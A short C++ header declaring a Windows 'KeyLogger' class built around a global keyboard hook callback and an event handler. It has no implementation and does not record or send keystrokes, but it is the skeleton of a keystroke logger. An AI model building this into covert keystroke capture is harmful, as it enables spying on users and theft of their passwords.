#pragma once

#include <functional>
#include <mutex>
#include <Windows.h>

class KeyLogger
{
public:
	KeyLogger();
	~KeyLogger();

private:
	static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

	void OnKeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam);

	static std::vector<KeyLogger*> _instances;
	static std::unique_ptr<HHOOK> _hook;
};

